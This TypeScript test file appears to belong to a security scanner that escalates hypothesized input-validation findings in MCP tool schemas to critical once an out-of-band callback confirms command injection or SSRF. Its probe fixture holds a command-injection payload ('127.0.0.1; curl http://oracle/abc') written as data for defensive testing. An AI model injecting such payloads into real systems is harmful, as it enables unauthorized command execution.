/**
 * Tests for the confirmed-callback escalation.
 *
 * The property under test throughout: static analysis states a hypothesis,
 * an oracle callback settles it, and nothing else moves a severity. The
 * inverse — a `rejected` probe quietly downgrading a finding — is the
 * failure this rule set is most exposed to, since one boolean covers four
 * different meanings including a successful injection that exited nonzero.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { escalateConfirmedFindings } from "./escalate.js";
import { computeScore } from "../core/compliance.js";
import type { AuditResult, Finding, Severity } from "../core/types.js";
import type { LiveAuditResult, LiveProbeResult, ProbeStatus } from "./types.js";

function ivFinding(toolName: string, fieldPath: string, severity: Severity = "medium"): Finding {
  return {
    ruleId: "IV-001",
    pillar: "schema-integrity",
    severity,
    confidence: "hypothesized",
    title: `Unconstrained input on potentially sensitive field "${fieldPath}" (unverified)`,
    detail: "This is a hypothesis from the field's name and shape.",
    location: {
      file: "mcp.tools.json",
      jsonPath: `tools["${toolName}"].inputSchema.properties.${fieldPath}`,
    },
    remediation: "First establish what it actually does.",
  };
}

function auditOf(findings: Finding[]): AuditResult {
  return {
    timestamp: "2026-08-19T00:00:00.000Z",
    toolsScanned: 1,
    serversScanned: 1,
    findings,
    score: computeScore(findings),
    warnings: [],
  };
}

function probe(
  toolName: string,
  fieldPath: string,
  status: ProbeStatus,
  kind: LiveProbeResult["kind"] = "command-injection"
): LiveProbeResult {
  return {
    toolName,
    fieldPath,
    kind,
    reason: "field name matches an execution-adjacent keyword",
    payload: "127.0.0.1; curl http://oracle/abc",
    nonce: "abc",
    status,
    callback:
      status === "confirmed"
        ? { nonce: "abc", receivedAt: "2026-08-19T00:00:01.000Z", remoteAddress: "172.18.0.2" }
        : null,
    callbackTimeoutMs: 4000,
    toolCall: { textPreview: "" },
  } as LiveProbeResult;
}

function liveOf(probes: LiveProbeResult[]): LiveAuditResult {
  return {
    timestamp: "2026-08-19T00:00:00.000Z",
    serverName: "t",
    transportKind: "stdio",
    payloadEligibility: { eligible: true, sandboxed: true, kind: "stdio" },
    outcome: "probed",
    unreachable: null,
    sandboxSetupMs: 0,
    containerStartMs: 0,
    pid: 1,
    connectDurationMs: 1,
    liveTools: [],
    toolDrift: [],
    probes,
    poisoningChecks: [],
    oracle: { baseUrl: "http://127.0.0.1:1" },
    warnings: [],
    errors: [],
    durationMs: 1,
  };
}

test("a confirmed callback escalates the matching finding to critical", () => {
  const before = auditOf([ivFinding("run_diagnostic", "hostname")]);
  const after = escalateConfirmedFindings(before, [
    liveOf([probe("run_diagnostic", "hostname", "confirmed")]),
  ]);

  assert.equal(after.findings.length, 1);
  const f = after.findings[0]!;
  assert.equal(f.severity, "critical");
  assert.equal(f.ruleId, "IV-101");
  assert.match(f.title, /^CONFIRMED command injection/);
  // The tentative static framing must not survive onto a critical finding.
  // Naming the superseded hypothesis is fine — still calling the result one
  // is not.
  assert.doesNotMatch(f.title, /unverified/i);
  assert.doesNotMatch(f.detail, /not an observation|worth looking/i);
  assert.match(f.detail, /not inferred from the schema/i);
  assert.match(f.detail, /now settled/i);
  // The remediation must stop hedging about whether a fix is needed.
  assert.match(f.remediation!, /confirmed to reach an interpreter|not a fix/i);
  // The evidence has to travel with it: nonce, time, and the payload sent.
  assert.match(f.detail, /abc/);
  assert.match(f.detail, /172\.18\.0\.2/);
  assert.match(f.detail, /IV-001/);
  // Provenance preserved — same field, same file.
  assert.equal(f.location.jsonPath, 'tools["run_diagnostic"].inputSchema.properties.hostname');
});

test("escalation recomputes the score rather than carrying the old one", () => {
  const before = auditOf([ivFinding("t", "command")]);
  // 100 - medium(15) x hypothesized(0.25) = 96.25, rounded.
  assert.equal(before.score.value, 96);
  assert.equal(before.score.grade, "A");

  const after = escalateConfirmedFindings(before, [liveOf([probe("t", "command", "confirmed")])]);
  // 100 - critical(50) x confirmed(1.25) = 37.5, rounded. The whole point
  // of the escalation is that it moves the grade hard: a field that read
  // as an A-grade hypothesis is now an F-grade proven injection, on the
  // strength of a callback rather than a re-reading of the same schema.
  assert.equal(after.score.value, 38);
  assert.equal(after.score.grade, "F");
});

test("a rejected probe changes nothing — never a downgrade", () => {
  // Four meanings behind one isError boolean, one of which is a successful
  // injection whose command exited nonzero. Reading that as "safe" is the
  // single worst thing this join could do.
  const before = auditOf([ivFinding("t", "command")]);
  const after = escalateConfirmedFindings(before, [liveOf([probe("t", "command", "rejected")])]);
  assert.deepEqual(after, before);
  assert.equal(after.findings[0]!.severity, "medium");
});

test("an unconfirmed probe changes nothing either", () => {
  const before = auditOf([ivFinding("t", "command")]);
  const after = escalateConfirmedFindings(before, [liveOf([probe("t", "command", "unconfirmed")])]);
  assert.deepEqual(after, before);
});

test("escalation is exact per field — a sibling field on the same tool is untouched", () => {
  const before = auditOf([ivFinding("t", "command"), ivFinding("t", "path")]);
  const after = escalateConfirmedFindings(before, [liveOf([probe("t", "command", "confirmed")])]);

  assert.equal(after.findings.find((f) => f.location.jsonPath!.endsWith("command"))!.severity, "critical");
  assert.equal(after.findings.find((f) => f.location.jsonPath!.endsWith("path"))!.severity, "medium");
});

test("a nested field is never matched by a top-level probe of the same leaf name", () => {
  // IV-001 walks nested schemas and emits a dotted path; the probe
  // classifier only ever produces top-level names. `config.command` must
  // not be escalated by a confirmed probe of `command`.
  const before = auditOf([ivFinding("t", "config.command")]);
  const after = escalateConfirmedFindings(before, [liveOf([probe("t", "command", "confirmed")])]);

  assert.equal(after.findings[0]!.severity, "medium");
  assert.equal(after.findings[0]!.ruleId, "IV-001");
  // The confirmed probe still has to surface — as a synthesized finding,
  // not silently dropped.
  assert.equal(after.findings.length, 2);
  assert.equal(after.findings[1]!.ruleId, "IV-101");
});

test("a confirmed probe with no static finding is reported, not dropped", () => {
  // Should be unreachable while probe selection and IV-001 share a
  // predicate. If they ever drift, the failure mode must not be a proven
  // injection vanishing from the findings list.
  const before = auditOf([]);
  const after = escalateConfirmedFindings(before, [liveOf([probe("t", "code", "confirmed", "ssrf")])]);

  assert.equal(after.findings.length, 1);
  assert.equal(after.findings[0]!.severity, "critical");
  assert.match(after.findings[0]!.title, /CONFIRMED server-side request forgery/);
  assert.match(after.findings[0]!.detail, /No static finding existed on this field/);
  assert.equal(after.findings[0]!.confidence, "confirmed");
  assert.equal(after.score.value, 38);
  assert.equal(after.score.grade, "F");
});

test("confirmations across several servers all apply to one result", () => {
  const before = auditOf([ivFinding("a", "command"), ivFinding("b", "url")]);
  const after = escalateConfirmedFindings(before, [
    liveOf([probe("a", "command", "confirmed")]),
    liveOf([probe("b", "url", "confirmed", "ssrf")]),
  ]);
  assert.equal(after.findings.filter((f) => f.severity === "critical").length, 2);
});

test("no confirmations returns the original object untouched", () => {
  const before = auditOf([ivFinding("t", "command")]);
  const after = escalateConfirmedFindings(before, [liveOf([])]);
  assert.equal(after, before);
});

test("escalation does not mutate the input result", () => {
  const original = ivFinding("t", "command");
  const before = auditOf([original]);
  const snapshot = JSON.parse(JSON.stringify(before)) as AuditResult;

  escalateConfirmedFindings(before, [liveOf([probe("t", "command", "confirmed")])]);

  assert.deepEqual(before, snapshot);
  assert.equal(original.severity, "medium");
});
